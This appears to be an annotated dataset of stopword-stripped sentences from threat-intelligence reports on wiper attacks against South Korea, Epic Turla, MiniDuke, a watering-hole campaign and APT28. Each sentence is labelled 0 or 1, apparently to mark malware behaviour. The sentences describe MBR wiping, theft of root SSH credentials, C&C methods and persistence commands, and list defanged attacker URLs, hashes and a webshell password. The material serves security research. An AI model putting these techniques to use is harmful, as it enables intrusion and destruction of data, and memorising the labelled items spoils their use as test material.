Dropper samples consistently targeted AhnLab Policy Center propagation method	0
This information corroborated Black Hat Asia 2014 presentation Fortinet researcher Kyle Yang	0
CrowdStrike 's report also briefly noted use update server vector	0
Yang analyzed malware 's update config metadata matched format AhnLab Policy Center	0
To test payload Yang set server/client executed update server	0
As Yang predicted wiped client	0
While method initial compromise update server noted detail CrowdStrike 's report cites '' collateral information '' suggests targeted email attacks used gain initial entry policy servers compromised	1
The upload server vector included time-based logic bomb allowed wiper target large number systems set time date full permissions targeted systems	1
According CrowdStrike wiper malware dropped systems AgentBase.exe	1
The wiper used Windows utility 'taskkill ' kill processes pasvc.exe clisvc.exe main processes Ahnlab Hauri antivirus applications	1
The wiper performed system reconnaissance gathering drive information operating system version	1
Depending OS used wiper recursively deleted files file system deleting Windows folder last	1
It overwrote MBR strings '' HASTATI '' '' PRINCPES '' '' PRINCIPES '' '' PR NCPES ''	1
While several variants wiper seem used date	0
It unclear multiple wiper variants slightly differing behavior used campaign	0
One possible explanation multiple variants used minimize operational damage mission case early detection one variants	0
For example one wiper variant compromised detected antivirus IDS signatures variants may differed enough remain undetected still resulting mission success	0
According CrowdStrike third malware component downloaded IRC RAT various compromised websites	1
This RAT detected Symantec Backdoor.Prioxer	1
Prioxer linked 2011 attacks South Korea	0
It unclear whether downloaders pushed update server vector wipers	0
However two malware types use packer 'Jokra ' contain strings '' HASTATI '' '' PRINCPES ''	0
Based information identified strategic challenges impact development North Korea 's cyber warfare capabilities	0
We also noted relevant implications • The North Korean regime strictly controls Internet infrastructure meaning cyber activity dissidents autonomous hacker groups unlikely	0
In words cyber attacks originating North Korea assumed state sponsored	0
For reason according defectors regime 's cyber operators typically launch attacks directly within North Korea	0
Instead many regime-sponsored attacks launched cells based China U.S. South Asia Europe even South Korea	0
• North Korea limited number outgoing connections	0
For reason low probability DDoS originating within	0
However preclude use botnets local C2 server use networks third-party nations launch attacks	0
As seen July 2009 attacks South Korean U.S. targets North Korea leveraged networks countries Austria Georgia Germany even South Korea U.S. order launch cyber attacks	0
North Korea likely forced rely third parties quite time due lack sufficient infrastructure launching large-scale CNO	0
• Several outward facing websites hosted China countries	0
This implies two possibilities North Korea 's infrastructure handle heavy incoming traffic load regime wants separate propaganda crafted outside target audience internally-focused propaganda	0
This arrangement seems unlikely change foreseeable future	0
• North Korea known unstable power supplies limits scalability regime 's current CNO capabilities	0
This another reason expansion CNO capabilities using nation 's infrastructure seems unlikely foreseeable future	0
• North Korea known monetary deficiencies limit expansion infrastructure CNO capabilities least without third-party aid	0
North Korea continues rely heavily China sustainment	0
• Although see instances overt cyber operations North Korea reportedly spends much limited resources training equipping cyber operators speaks volumes	0
The human element regime 's cyber war program least potential	0
• Sanctions North Korea export laws prohibit sale certain technologies regime	0
In words order obtain technology needed cyber warfare program regime must improvise	0
North Korea must develop technology manufacture technology using plans obtained via industrial espionage rely third parties procure	0
However regime historically failed attempts large-scale production electronic components	0
At present North Korea relies China provide much network hardware including servers routers	0
It unlikely North Korea compromise nuclear program meaning sanctions likely longstanding regime continue rely third parties procure technology	0
Cyber incidents attributed North Korean actors seem follow distinct patterns  According reports researchers conventions C2 structure used North Korean cyber actors show continuity consistency time	0
 The majority incidents attributed North Korean actors consistently used wiper malware	0
 Several incidents included defacements different group taking credit time	0
Additionally little information attack history found groups aside information acknowledged report	0
These factors seem indicate single group may responsible several attacks time using different group names false flag	0
 On one occasion malware included provisions disable security software made South Korean security company AhnLab	0
This detail strengthens case malware written modified specifically target South Korean machines	0
 The attacks followed explicit pattern around time U.S. – South Korean joint military exercises others fell significant date response political events	0
 The primary targets South Korean U.S. entities	0
While nations traditionally targeted regime also possible South Korean entities quick attribute attack infrastructure North Korean actors	0
In fact cases South Korean reports source attribution	0
Does North Korea sufficient cyber infrastructure cyber warfare capabilities harm U.S. allies ? While North Korea 's cyber warfare capabilities pale comparison wealthier nations regime made significant progress developing infrastructure establishing cyber operations	0
The rate progress warrants closer look North Korea's motivations TTPs capabilities	0
As noted North Korea views U.S. South Korea primary adversaries	0
The U.S. South Korea high-tech nations economies depend heavily technology	0
In contrast North Korea high tech culture	0
For reasons overestimate regime 's advanced cyber capability yet never underestimate potential impact North Korea utilizing less advanced quick-and-dirty tactics like DDoS cripple high-tech targets	0
Both government corporate entities susceptible targeted North Korean cyber attacks	0
North Korean juche ideology places survival regime primary goal perceived threat regime may targeted	0
Several attacks U.S. South Korean government financial critical infrastructure entities attributed North Korean origins.. These attacks often preceded occurred conjunction North Korea voicing negative sentiments targeted entities	0
As saw Iranian cyber actors HPSR Security Briefing Episode 11 state sponsored cyber actors often launch attack response political trigger	0
The pattern seems apply pro-North Korean cyber actors launched attacks coincide U.S	0
Independence Day anniversary start Korean War well propaganda cyber attacks response joint military exercises U.S. South Korea	0
As shown North Korea 's past behavior ( consistent doctrine ) easily '' pushed corner ''	0
At slightest perceived threat regime responds saber-rattling peacocking	0
The regime extremely defensive turn flex muscles show world capable even inaccurate display overall capabilities	0
The regime fears losing control nation 's culture ever-growing threat outside influence evidenced regime 's reaction comedy film '' The Interview ''	0
The regime represented citizens powerful capable entity used status control populace	0
For reason regime 's leaders forced continually demonstrate strength power illusion thereof domestically globally order maintain status needed ensure continued suppression population	0
This show power may require regime takes chances stretches beyond abilities times spirit juche songun regime continue façade fearful losing image leaders worked hard maintain	0
North Korean cyber operations generally observed originating home field IP address space geo-IP based blocking traffic originating net-blocks ineffective	0
Given North Korea capable technically trained forces demonstrate power feel provoked western entities consciously avoid promoting ideas doctrine blatantly slanderous regime	0
Encouraging ideas could cause entities become focal point North Korean cyber attacks	0
Due fact North Korean infrastructure aging resources able keep rest world entities interesting R & D IP ( intellectual property ) - especially military nature – could become targets interest North Korea	0
Interest defense-related IP R & D could also stem North Korea 's relationship China	0
In Chinese business culture taking another entity 's IP R & D stealing – accepted business usual	0
It possible North Korea Chinese influence would adopt attitude given regime 's limited capacity homegrown innovation	0
Known DPRK targets limited primarily South Korean U.S. organizations government entities	0
For targets prudent measures include The dropper component examined distributed UPX-packed binary	0
When executed creates following files affected user 's % Temp % directory After determining location user profile directories affected computer malware searches directories configuration files directories may associated connection manager clients mRemote SecureCRT	1
• mRemote-an open source tool centrally managing remote server connections using GUI ( Kevin Kline 2008 )	0
This tool longer actively developed supported	0
• SecureCRT-a commercial SSH Telnet client VanDyke Software	0
If mRemote installation located dropper reads configuration file checks there's NODE defined '' Username=root '' '' Protocol=SSH '' password blank	1
If conditions satisfied extracts information	1
The password decrypted extracted	0
If SecureCRT installation located dropper extracts information sessions Username=root Protocol=SSH saved password	1
If conditions satisfied username hostname port password extracted	0
The password decrypted	0
After extracting connection server details dropper uses previously dropped alg	1
exe conime.exe attempt connect remote servers upload run bash script ~pr1.tmp	1
The bash script initially checks UNIX running ( HP-UX SunOS Linux AIX ) attempts wipe /kernel /usr /etc /home directories thus rendering machine inoperative	1
When AgentBase.exe component executed first attempts stop following processes presumably order evade detection It enumerates physical drives overwrites first 512 bytes string '' princpes '' effectively destroying MBR ( master boot record ) affected drive	1
It continues look removable fixed drives locates root directory drives attempts delete files folders directory	1
Finally affected computer shut rebooted although wiping mechanisms successful machine able boot	1
Over last 10 months Kaspersky Lab researchers analyzed massive cyber-espionage operation call '' Epic Turla ''	0
The attackers behind Epic Turla infected several hundred computers 45 countries including government institutions embassies military education research pharmaceutical companies	0
The attacks known used least two zero-day exploits We also observed exploits older ( patched ) vulnerabilities social engineering techniques watering hole strategies attacks	0
The primary backdoor used Epic attacks also known '' WorldCupSec '' '' TadjMakhal '' '' Wipbot '' '' Tavdig ''	1
When G-Data published Turla/Uroburos back February several questions remained unanswered	0
One big unknown infection vector Turla ( aka Snake Uroburos )	0
Our analysis indicates victims infected via sophisticated multi-stage attack begins Epic Turla	1
In time attackers gain confidence upgraded sophisticated backdoors Carbon/Cobra system	1
Sometimes backdoors run tandem used '' rescue '' communications lost one backdoors	1
Once attackers obtain necessary credentials without victim noticing deploy rootkit extreme persistence mechanisms	1
The attacks still ongoing July 2014 actively targeting users Europe Middle East	0
Note A full analysis Epic attacks available Kaspersky Intelligent Services subscribers	0
Contact intelreports @ kaspersky.com The attacks campaign fall several different categories depending vector used initial compromise The attackers use direct spearphishing watering hole attacks infect victims	1
Watering holes ( waterholes ) websites interest victims compromised attackers injected serve malicious code	0
So far n't able locate e-mail used victims attachments	0
The PDF attachments show '' lure '' victim opened however SCR packages sometime show clean PDF upon successful installation	0
Some known attachment names used spearphishing attacks In cases filenames provide clues type victims attackers targeting	0
Currently Epic attackers run vast network watering holes target visitors surgical precision	1
Some injected websites include In total observed 100 injected websites	0
Currently largest number injected sites Romania	0
Here 's statistic injected websites The distribution obviously random reflects interests attackers	0
For instance Romania many infected sites Mures region many Spanish infected sites belong local governments ( City Hall )	0
Most infected sites use TYPO3 CMS ( see http //typo3.org/ ) could indicate attackers abusing specific vulnerability publishing platform	0
Injected websites load remote JavaScript victim 's browser The script '' sitenavigatoin.js '' Pinlady-style browser plugin detection script turn redirects PHP script sometimes called main.php wreq.php	1
Sometimes attackers register .JPG	1
extension PHP handler server using '' JPG '' files run PHP scripts The main exploitation script '' wreq.php '' '' main.php '' '' main.jpg '' performs numbers tasks	1
We located several versions script attempt various exploitation mechanisms	1
One version script attempts exploit Internet Explorer versions 6 7 8 Unfortunately Internet Explorer exploits yet retrieved	1
Another recent version attempts exploit Oracle Sun Java Adobe Flash Player Although Flash Player exploits could n't retrieved manage obtain Java exploits The Java files exploit popular vulnerability CVE-2012-1723 various configurations	1
The payload dropped Java exploits following The Java exploit use special loader attempts inject final Epic backdoor payload explorer.exe	1
The backdoor extracted Java exploits following C & C hardcoded inside This C & C still online moment although redirects currently suspended page '' hxxp //busandcoachdirectory.com [	1
] au ''	0
For full list C & C servers please see Appendix	0
The Epic Turla attackers extremely dynamic using exploits different methods depending available moment	0
Most recently observed using yet another technique coupled watering hole attacks	1
This takes advantage social engineering trick user running fake Flash Player ( MD5 030f5fdb78bfc1ce7b459d3cc2cf1877 ) In least one case tried trick user downloading running fake Microsoft Security Essentials app ( MD5 89b0f1a3a667e5cd43f5670e12dba411 ) The fake application signed valid digital certificate Sysprint AG This file distributed Ministry Foreign Affairs Tajikistan 's website '' hxxp //mfa [ ] tj/upload/security.php ''	1
The file .NET	1
application contains encrypted resource	1
This drops malicious file MD5 7731d42b043865559258464fe1c98513	1
This Epic backdoor connects following C & Cs generic internal ID 1156fd22- 3443-4344-c4ffff A full list C & C server URLs recovered samples found technical Appendix	1
The Epic backdoors commanded huge network hacked servers deliver command control functionality	1
The huge network commanded Epic Turla attackers serves multiple purposes	1
For instance motherships function exploitation sites command control panels malware	1
Here 's big picture looks like The first level command control proxies generally talk second level proxies turn talk '' mothership '' server	1
The mothership server generally VPS runs Control panel software used interact victims	1
The attackers operate mothership using network proxies VPN servers anonymity reasons	0
The mothership also work exploitation servers used watering hole attacks delivering Java IE fake applications victim	1
We able get copy one motherships provided insight operation	0
It runs control panel password protected Once logged Control panel attackers see general overview system including number interesting potential targets A interesting file servers task.css attackers define IP ranges interested	1
To change file using '' Task editor '' menu	0
Depending '' tasks '' decide whether infect visitors	1
In case found targeted two ranges belonging It noted though fact attackers targeting ranges n't necessarily mean also got infected	1
Some unknown IPs also observed targeting schedules	0
There also '' except.css '' file attackers log reasons n't try exploit certain visitors	0
There three possible values These '' n't meet conditions '' reasons observed logs For first stage attack threat actor uses custom backdoor	1
In cases backdoor packaged together CVE-2013-5065 EoP exploit heavily obfuscated	1
This makes analysis difficult	0
The CVE-2013-5065 exploit allows backdoor achieve administrator privileges system run unrestricted	1
This exploit works unpatched Microsoft Windows XP systems	0
Other known detection names backdoor Trojan.Wipbot ( Symantec ) Tavdig	0
The main backdoor 60KB size implements C & C protocol top normal HTTP requests	1
The communication protocol uses requests C & C replies malware decrypts processes	1
The replies sent back C & C channel	1
The malware behavior defined configuration block	0
The configuration block usually contains two hard-coded C & C URLs	0
He also seen one case configuration block contains one URL	0
The configuration also updated fly attackers via C & C	1
The backdoor attempts identify following processes found terminate It contains internal unique ID used identify victim C & C	1
Most samples especially old ones ID 1156fd22-3443-4344-c4ffff	0
Once victim confirmed '' interesting '' attackers upload another Epic backdoor unique ID used control specific victim	1
During first C & C call backdoor sends pack victim 's system information	1
All information sent C & C encrypted public key framework making decryption impossible	1
The commands C & C encrypted simpler manner decrypted intercepted secret key hardcoded malware	1
Through monitoring able capture large amount commands sent victims attackers providing unique view operation	1
Here 's look one encrypted server replies Once victim infected '' checks '' server attackers send template commands Next attackers try move victim 's network using pre-defined collected passwords Listing .doc	1
files recursively also common '' theme '' In total decoded several hundreds command packages delivered victims providing unique insight inner workings attackers	0
In addition generic searches specific lookups observed well	0
These include searches In case attackers interested find e-mails related '' NATO '' '' Energy Dialogue within European Unition ''	1
For C & C servers attackers implemented RSA encryption C & C logs makes impossible decrypt	1
This scheme implemented April 2014	0
Once victim compromised attackers upload several tools used lateral movement	1
One tool observed attacks saved '' C \Documents Settings\All users\Start Menu\Programs\Startup\winsvclg.exe '' This keylogger tool creates % temp % \~DFD3O8.tmp	1
Note filename change across victims	0
On one Central Asian government 's Ministry Foreign Affairs victim system filename used '' adobe32updt.exe ''	0
In addition custom tools observed usage standard administration utilities	0
For instance another tool often uploaded attackers victim 's machine '' winrs.exe '' This UPX packed binary contains genuine '' dnsquery.exe '' tool Microsoft unpacked MD5 c0c03b71684eb0545ef9182f5f9928ca	1
In several cases interesting update observed -- malware different yet related family	0
This backdoor sophisticated belongs next level cyber-espionage tools called '' Carbon system '' Cobra Turla attackers	1
Several plugins '' Carbon system '' known exist	0
Note command control servers www.losguayaberos [	0
] com thebesttothbrushes [	0
] com sinkholed Kaspersky Lab	0
Other packages delivered victims include These top level packages deploy updated Epic backdoors Turla Carbon system backdoors confirmed victims effectively linking Epic Turla Carbon operations together	1
The Turla Carbon dropper packages following properties This called internally authors '' Carbon System '' part '' Cobra '' project seen debug path inside This acts dropper following modules 32 64 bit The Carbon system essence extensible platform similar attack platforms Tilded platform Flame platform	1
The plugins Carbon system easily recognized always feature least two exports named Several Epic backdoors appear designed work Carbon system plugins well - require specialized loader start victim systems Carbon system deployed	0
Some modules artifacts indicate Carbon system already version 3.x although exact Carbon system version rarely seen samples The author Carbon module also seen code '' gilg '' also authored several Turla modules	0
We planning cover Turla Carbon system details future report	0
The payload recovered one mothership servers ( newsforum.servehttp [	1
] com/wordpress/wp-includes/css/img/upload.php MD5 4dc22c1695d1f275c3b6e503a1b171f5 Compiled Thu Sep 06 14:09:55 2012 ) contains two modules loader/injector backdoor	1
Internally backdoor named '' Zagruzchick.dll '' The word '' Zagruzchick '' means '' boot loader '' Russian	0
The Control panel Epic motherships also sets language codepage '' 1251 '' Codepage 1251 commonly used render Cyrillic characters	0
There indications attackers native English language speakers The sample e9580b6b13822090db018c320e80865f delivered several Epic victims upgraded backdoor compilation code page language set '' LANGRUSSIAN ''	1
The threat actor behind '' Epic '' operation uses mainly hacked servers host proxies	0
The hacked servers controlled use PHP webshell	0
This shell password protected ; password checked MD5 hash The MD5 '' af3e8be26c63c4dd066935629cf9bac8 '' solved Kaspersky Lab password '' kenpachi ''	0
In February 2014 observed Miniduke threat actor using backdoor hacked servers although using much stronger password	1
Once also interesting point usage Codepage 1251 webshell used render Cyrillic characters	0
There appears several links Turla Miniduke leave future blogpost	0
On C & C servers used Epic attacks able identify detailed victim statistics saved debugging purposes attackers	1
This country distribution top 20 affected countries victim 's IP According public information available victims ' IPs targets '' Epic '' belong following categories When G-Data published Turla paper details publicly available victims get infected malware campaign	0
Our analysis indicates sophisticated multi-stage infection ; begins Epic Turla	0
This used gain foothold validate high profile victim	1
If victim interesting get upgraded Turla Carbon system	1
Most recently observed attack Kaspersky Lab user August 5 2014 indicating operation remains fresh ongoing	0
Note A full analysis Epic attacks available Kaspersky Intelligent Services customers	0
On September 24 2014 FireEye observed new strategic web compromise ( SWC ) campaign believe targeting non-profit organizations non-governmental organizations ( NGO ) hosting iframes legitimate websites	0
The compromised websites contained iframe direct site visitors threat actor-controlled IP address dropped Poison Ivy remote access tool ( RAT ) onto victims ' systems	1
FireEye yet attributed activity though identified links Sunshop Digital Quartermaster collective malware authors supports multiple China-based advanced persistent threat ( APT ) groups	0
FireEye previously established detection measures threat activity ensuring clients prepared intrusion attempts well advance threat actor implementation	0
On September 24 FireEye observed SWCs likely conducted unitary threat group based shared infrastructure tools least three different websites international non-profit organization focuses environmental advocacy two different NGOs promote democracy human rights	0
The group able compromise websites insert malicious iframes	1
Figure 1 displays one iframes	0
The threat group obfuscated iframe two compromised websites	1
The iframes websites directed visitors Java exploits hosted 103.27.108.45	1
In turn exploits downloaded decoded payload hosted hxxp //103.27.108.45/img/js.php	1
A GET request URI returned following content The 'bin ' param shown Figure 2 decoded ASCII hex Java exploit	0
Once decoded FireEye identified payload Poison Ivy variant	0
It following properties The backdoor also contained versioning info embedded RTVERSION one PE resources This versioning info attempted masquerade Google Chrome file	1
However malware author misspelled multiple words attempting put versioning information particular build	0
The Poison Ivy implant following configuration properties The C2 domain quakegoogle.servequake [ ] com resolved 115.126.62.100 time SWCs	1
Other domains resolving IP include following Between August 30 2014 September 16 2014 also observed SOGU ( aka Kaba ) callback traffic sent assign.ddnsking.com port 443	1
The Poison Ivy backdoor also RTMANIFEST PE resource SHA256 fingerprint 82a98c88d3dd57a6ebc0fe7167a86875ed52ebddc6374ad640407efec01b1393	0
This RTMANIFEST resource documented previous Sunshop Digital Quartermaster report	0
FireEye previously identified specific RTMANIFEST 'Sunshop Manifest ' observed manifest resource used 86 samples	0
As stated Quartermaster report believe shared resource artifact builder toolkit made available number China- based APT groups	0
This activity represents new SWC campaign	0
We suspect threat actors leveraging access compromised websites belonging NGOs non-profits target organizations industries	0
These websites often visited organization employees organizations industries allowing threat actors move laterally within already compromised networks gain access new networks	0
While FireEye attributed activity specific threat group frequently observe China-based threat actors target non-profits NGOs suspect seek monitor activity within borders may lead domestic unrest embarrass Chinese government	0
For example 2013 FireEye observed China-based threat actors steal grant applications activity reports specifically related international NGO 's China-based activities	0
We suspects threat actors sought monitor programs involved individuals	0
The three organizations whose websites hosting malicious iframes China-based operations	0
FireEye releasing information campaign allow organizations investigate prepare activity networks	0
We believe non-profits NGOs remain elevated risk intrusion especially wary attempts compromise networks using SWC	0
Threat actors may use SWCs achieve goal FireEye discount possibility threat actors use means disposal including phishing	0
Based past threat actor activity industry FireEye expects threat actors motivated steal programmatic data monitor organizations ' programs specific countries	0
If China-based threat actors behind observed campaign FireEye expects organizations operations China high-priority targets	0
FireEye currently detection measures place allow users FireEye products detect SWC activity	0
It also likely industries organizations affected SWC activity since sites public facing frequently visited	0
Special thanks Google 's Billy Leonard providing additional information research	0
Thanks following authors contributions Mike Oppenheim Ned Moran Steve Stone	0
This entry posted Threat Intelligence Threat Research Sarah Engle Ben Withnell	0
Bookmark permalink	0
At end April Microsoft announced vulnerability Word actively exploited	0
This vulnerability occurred parsing RTF files assigned CVE-2014-1761 thorough analysis found HP Security Research blog	0
We since seen multiple cases exploit used deliver malware one particularly interesting contained new variant MiniDuke ( also known Win32/SandyEva )	1
MiniDuke first discussed Kaspersky March 2013 paper The MiniDuke Mystery PDF 0- day Government Spy Assembler 0x29A Micro Backdoorand shortly paper Bitdefender	0
Some characteristics MiniDuke - small size ( 20 KB ) crafty use assembly programming use zero-day exploits distribution - made intriguing threat	1
Although backdoor still quite similar previous versions important changes made since last year notable introduction secondary component written JScript contact C & C server via Twitter	1
The exploit document named Proposal-Cover-Sheet-English.rtf quite bland compared documents used 2013 political nature	0
We received document April 8th three days compilation MiniDuke payload dated April 5th PE header	0
The payload remains quite small 24 KB	0
The functionality shellcode executed triggering vulnerability rather simple straightforward	1
After decrypting obtaining addresses functions exported kernel32.dll decrypts drops payload % TEMP % directory file named '' a.l '' subsequently loaded calling kernel32 LoadLibraryA	1
An interesting thing shellcode transferring control API function checks first bytes function order detect hooks debugger breakpoints may set security software monitoring tools	1
If found shellcode skips first 5 bytes function called manually executing prologue instructions ( mov edi edi ; push ebp ; mov ebp esp ) jumping function code illustrated	0
The next graph presents execution flow malware exploitation successful	0
As mentioned previously version MiniDuke payload comes two modules refer main module TwitterJS module	0
Once MiniDuke receives control checks host process rundll32.exe whether current directory % TEMP %	0
If either conditions met malware assumes run first time proceeds installation onto system	1
MiniDuke gathers information system encrypts configuration based information method also used OSX/Flashback ( process called watermarking Bitdefender )	1
The end result impossible retrieve configuration encrypted payload analyzing different computer	1
The information collected infection changed since previous version consists following values Once encrypted version malware created written file % ALLUSERSPROFILE % \Application Data directory	1
The name file randomly picked following values ( find listing next screenshots VirusRadar description The filename extension also picked randomly following list To persist infected system reboots malware creates hidden .LNK file '' Startup '' directory pointing modified main module	1
The name .LNK	0
file randomly drawn following values The .LNKfile	1
created using COM object IShellLinkA interface contains following command '' C \Windows\system32\rundll32.exe % pathtomainmodule % exportfunction '' Which gives something like '' C \Windows\system32\rundll32.exe C \DOCUME~1\ALLUSE~1\APPLIC~1\data.cat IlqUenn ''	1
When malware loaded rundll32.exe current directory n't % TEMP % malware starts gathering system information described '' Installation '' section decrypt configuration information	1
As previous version MiniDuke checks presence following processes system If found system configuration information decrypted incorrectly i.e	0
malware run system without communication C & C servers	0
If configuration data decrypted correctly MiniDuke retrieves Twitter page @ FloydLSchwartz search URLs reach C & C server	1
It looks tag '' X ) ) ) '' page ( MiniDuke searching '' uri '' previous samples ) tag found decrypts URL data follows	0
The Twitter account @ FloydLSchwartz exist retweets strings special tag	0
As next step MiniDuke gathers following information infected systems This information sent C & C server along request download payload	1
The final URL used communicate C & C server looks like urlstart /create.php ? rndparam = systeminfo Those tokens derived follows An example URL given The payload downloaded file named '' fdbywu '' using urlmon URLDownloadToFileA API The downloaded payload fake GIF8 file containing encrypted executable	1
The malware processes downloaded file way previous samples MiniDuke verifies integrity file using RSA-2048 decrypts stores file finally executes	1
The RSA-2048 public key verify integrity executable inside GIF file previous version MiniDuke	1
In event MiniDuke unable retrieve C & C URL account generates username search based current date	0
The search query changes roughly every seven days similar backup mechanism previous versions using Google searches	0
A Python implementation algorithm found Appendix B	0
The TwitterJS module extracted creating copy Windows DLL cryptdll.dll injecting block code redirecting exported functions code	1
Here export address table patched binary looks modifications	0
This file stored Alternate Data Stream ( ADS ) NTUSER.DAT % USERPROFILE % folder	1
Finally DLL registered Open command drive open effect starting bot every time user opens disk drive	1
Below find content init.cmd script used MiniDuke install TwitterJS module onto system	1
When loaded TwitterJS instantiates JScript COM object decrypts JScript file containing core logic module	0
Prior executing MiniDuke applies light encoding script The next images show result two separate obfuscations see variables different values	1
This probably done thwart security systems scan entry points JScript engine	1
The purpose script use Twitter find C & C retrieve JScript code execute	1
It first generates Twitter user search ; search term changes every 7 days actually match real account name Twitter account name	0
The bot visits Twitter profiles returned search looks links end '' .xhtml	0
''	0
When one found replaces '' .xhtml	0
'' '' .php	0
'' fetches link	0
Information computer embedded Accept HTTP header	0
The first link retrieved page contain base64 data ; name attribute link used rolling XOR key decrypt JScript code	0
Finally MiniDuke calculates hash fetched script compares hardcoded hash TwitterJS script	0
If match fetched script executed calling eval ( )	0
The code hashing algorithm used component looks much like SHA-1 outputs different hashes ( find complete implementation Appendix B	0
We decided search changed algorithm ; one working hypotheses algorithm might altered make collisions feasible	0
We could n't find obvious difference ; constants steps algorithm expected	0
Then noticed short messages second 32-bit word different compared original SHA-1	0
By examining 2nd word generated finally discovered caused scope issue	0
As shown SHA-1 function used variable named f function Z ( ) called also uses variable named f without var keyword causing treated global variable rather local function	0
The end result value f also changed SHA-1 function affects value 2nd word round ultimately whole hash long messages	0
A likely explanation problem came variable names changed single letters using automated tool prior embedding payload	0
The 2 f variables probably different names original script avoided issue	0
So leaves us two takeaways 1 ) The difference hashing algorithm unintentional 2 ) Always declare local variables var keyword	0
; - ) We generated list Twitter search terms 2013-2014 checked registered	0
At moment one exists @ AA2ADcAOAA TwitterJS account generated August 21st 27th 2013	0
This account tweets	0
In effort discover potential victims registered Twitter accounts corresponding current week main TwitterJS components set tweets encrypted URLs infected computer would reach server	0
So far received connections via TwitterJS accounts four computers located Belgium France UK	0
We contacted national CERTs notify affected parties	0
We detect RTF exploit document Win32/Exploit.CVE-2014-1761.D MiniDuke components Win32/SandyEva.G	0
Our clients often ask us assess threat Russia poses cyberspace	0
Russia long whispered frontrunner among capable nations performing sophisticated network operations	0
This perception due part Russian government 's alleged involvement cyber attacks accompanying invasion Georgia 2008 well rampant speculation Moscow behind major U.S. Department Defense network compromise also 2008	0
These rumored activities combined dearth hard evidence made Russia something phantom cyberspace	0
In paper discuss threat group whose malware already fairly well-known cybersecurity community	0
This group unlike China-based threat actors track appear conduct widespread intellectual property theft economic gain	0
Nor observed group steal profit financial account information	0
The activity profile paper appears work skilled team developers operators collecting intelligence defense geopolitical issues – intelligence would useful government	0
We believe advanced persistent threat ( APT ) group engaged espionage political military targets including country Georgia Eastern European governments militaries European security organizations since least 2007	0
They compile malware samples Russian language settings working hours consistent time zone Russia 's major cities including Moscow St. Petersburg	0
While n't pictures building personas reveal government agency name evidence long- standing focused operations indicate government sponsor – specifically government based Moscow	0
We tracking group APT28	0
APT28 targets insider information related governments militaries security organizations would likely benefit Russian government	0
Malware compile times suggest APT28 developers consistently updated tools last seven years	0
Since 2007 APT28 systematically evolved malware using flexible lasting platforms indicative plans long-term use	0
The coding practices evident group's malware suggest high level skill interest complicating reverse engineering efforts	0
• Malware compile times suggest APT28 developers consistently updated tools last seven years	0
• APT28 malware particular family modular backdoors call CHOPSTICK indicates formal code development environment	0
Such environment would almost certainly required track define various modules included backdoor compile time	0
• APT28 tailors implants specific victim environments	0
They steal data configuring implants send data network using victim network 's mail server	1
• Several APT28 's malware samples contain counter- analysis capabilities including runtime checks identify analysis environment obfuscated strings unpacked runtime inclusion unused machine instructions slow analysis	1
Indicators APT28 's malware suggest group consists Russian speakers operating business hours Russia 's major cities	0
More half malware samples Portable Executable ( PE ) resources attributed APT28 included Russian language settings ( opposed neutral English settings ) suggesting significant portion APT28 malware compiled Russian language build environment consistently course six years ( 2007 2013 )	0
Over 96 % malware samples attributed APT28 compiled Monday Friday	0
More 89 % compiled 8AM 6PM UTC+4 time zone parallels working hours Moscow St. Petersburg	0
These samples compile dates ranging mid-2007 September 2014	0
Three themes APT28 's targeting clearly reflect areas specific interest Eastern European government likely Russian government	0
Many APT28 's targets align generally interests typical government	0
However three themes APT28 's targeting clearly reflects areas specific interest Eastern European government likely Russian government	0
These include Caucasus ( especially Georgian government ) Eastern European governments militaries specific security organizations	0
APT28 uses spearphishing emails target victims common tactic threat group crafts emails mention specific topics ( lures ) relevant recipients	1
This increases likelihood recipients believe email legitimate interested opening message opening attached files clicking link body email	0
Since spearphishing lures tailored recipients whose accounts APT28 hopes breach subjects lures provide clues APT28's targets interests	0
For example group's lures repeatedly refer Caucasus likely indicates APT28 trying gain access accounts individuals whose work pertains Caucasus	0
Similarly APT28 's practice registering domains mimic legitimate news politics websites indicates topics relevant APT28 's targets	0
We identified three themes APT28 's lures registered domains together particularly relevant Russian government	0
In addition themes seen APT28 target range political military organizations	0
We assess work organizations serves nation state governments	0
The Caucasus region includes Chechnya Russian republics independent states Georgia Armenia Azerbaijan continues experience political unrest	0
The Georgian government 's posture ties West frequent source Moscow 's frustration particularly 2008 war	0
Overall issues Caucasus likely serve focal points Russian intelligence collection efforts	0
Since 2011 APT28 used lures written Georgian probably intended target Georgian government agencies citizens	1
APT28 likely seeking information Georgia's security diplomatic postures	0
Specifically group targeted Georgian Ministry Internal Affairs ( MIA ) Ministry Defense ( MOD )	0
We also observed efforts target journalist working issues Caucasus controversial Chechen news site	0
APT28 made least two specific attempts target Georgian Ministry Internal Affairs	0
The MIA harbors sensitive information inner workings Georgia 's security operations country 's engagement multilateral institutions government 's communications backbone	0
It responsible APT28 made least two specific attempts target MIA	0
In one case identified APT28 lure mid-2013 referenced MIA-related topics employed malware attempted disguise activity legitimate MIA email traffic	1
The lure consisted weaponized Excel file presented decoy document containing list Georgian driver 's license numbers	1
The backdoor attempted establish connection Georgian MIA mail server communicate via MIA email addresses ending '' @ mia.ge.gov ''	1
Once connected mail server APT28 's backdoor sent email message using subject line related driver's licenses ( Georgian ) attached file containing system reconnaissance information	1
This tactic could allow APT28 obtain data MIA 's network less-monitored route limiting MIA network security department 's abilities detect traffic	1
In second example MIA targeting APT28 lure used information technology-themed decoy document included references Windows domain '' MIA Users\Ortachala… '' ( Figure 1 )	1
This probably referred MIA facility Ortachala district Tbilisi Georgia 's capital city	0
The decoy document also contains metadata listing '' MIA '' company name '' Beka Nozadze '' author possible reference system administrator Tbilisi	1
The text document purports provide domain user group setup information internal Windows XP Windows 7 systems	1
APT28 possibly crafted document appear legitimate MIA system users intended breach MIA network specifically using embedded malware	1
APT28 also appeared target Georgia 's MOD along U.S. defense contractor training Georgian military	0
APT28 used lure document installed SOURFACE downloader ( discussed Malware section ) contained listing birthdays members working group Georgian MOD U.S. defense contractor	1
The U.S. contractor involved working group advise MOD Georgian Armed Forces assess Georgia's military capabilities develop military training program country	0
We believe APT28 's targeting MOD aligns Russian threat perceptions	0
The growing U.S.-Georgian military relationship source angst Russia	0
Georgia Russia severed diplomatic relations following Russia-Georgia War 2008 Georgia since sought align closely western security organizations	0
Additionally June 2014 despite Russia 's vocal objections Georgia along Ukraine Moldova signed association accords EU	0
This move placed three countries firmly EU 's political economic security spheres influence	0
Georgian military security issues particularly regard U.S. cooperation NATO provide strong incentive Russian state-sponsored threat actors steal information sheds light topics	0
Targeting journalists could provide APT28 sponsors way monitor public opinion identify dissidents spread disinformation facilitate targeting	0
Another one APT28 's lures appeared target specific journalist covering issues Caucasus region	1
